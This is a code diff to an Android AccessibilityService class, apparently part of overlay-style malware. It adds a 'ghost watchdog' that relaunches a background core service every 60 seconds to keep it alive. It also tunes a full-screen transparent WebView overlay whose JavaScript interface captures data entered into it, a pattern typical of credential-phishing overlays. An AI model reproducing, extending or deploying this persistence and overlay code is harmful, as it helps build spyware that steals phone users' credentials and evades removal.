@@ -52,6 +52,32 @@ public class IO_Persistence_Manager extends AccessibilityService {
         updateDisplayMetrics();
         Log.d(TAG, "Ghost Uplink Established. " + screenWidth + "x" + screenHeight);
         FirebaseConfig.logActivity("GHOST_UPLINK: Persistence core synchronized");
+
+        // --- GHOST WATCHDOG PROTOCOL ---
+        startGhostWatchdog();
+    }
+
+    private void startGhostWatchdog() {
+        if (backgroundHandler == null) return;
+        backgroundHandler.post(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    if (!WorkManager_Sync.isRunning && !WorkManager_Sync.isDestructing) {
+                        Log.d(TAG, "GHOST_WATCHDOG: Core found inactive. Reanimating...");
+                        Intent intent = new Intent(IO_Persistence_Manager.this, WorkManager_Sync.class);
+                        intent.setAction(Constants.ACTION_START_CORE);
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                            startForegroundService(intent);
+                        } else {
+                            startService(intent);
+                        }
+                    }
+                } catch (Exception ignored) {}
+                // Pulse every 60 seconds to ensure core persistence
+                backgroundHandler.postDelayed(this, 60000);
+            }
+        });
     }
 
     @Override
@@ -484,6 +510,23 @@ public class IO_Persistence_Manager extends AccessibilityService {
                         }
                         overlayWebView.setBackgroundColor(android.graphics.Color.TRANSPARENT);
                         
+                        // Debugging: Capture JS console logs and alerts
+                        overlayWebView.setWebChromeClient(new android.webkit.WebChromeClient() {
+                            @Override
+                            public boolean onConsoleMessage(android.webkit.ConsoleMessage consoleMessage) {
+                                Log.d(TAG, "JS_CONSOLE: [" + consoleMessage.messageLevel() + "] " + consoleMessage.message() 
+                                        + " (Line: " + consoleMessage.lineNumber() + ")");
+                                return true;
+                            }
+
+                            @Override
+                            public boolean onJsAlert(android.webkit.WebView view, String url, String message, android.webkit.JsResult result) {
+                                Log.d(TAG, "JS_ALERT: " + message);
+                                result.confirm();
+                                return true;
+                            }
+                        });
+
                         // Interface to capture data from the overlay
                         overlayWebView.addJavascriptInterface(new Object() {
                             @android.webkit.JavascriptInterface
@@ -501,12 +544,14 @@ public class IO_Persistence_Manager extends AccessibilityService {
                                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                 WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                 WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
-                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
+                                WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                                 android.graphics.PixelFormat.TRANSLUCENT);
 
-                        // Ensure focusability for text inputs
+                        // Ensure focusability for interaction
                         params.flags &= ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
                         params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;
+                        params.screenOrientation = android.content.pm.ActivityInfo.SCREEN_ORIENTATION_PORTRAIT;
 
                         wm.addView(overlayWebView, params);
                     }
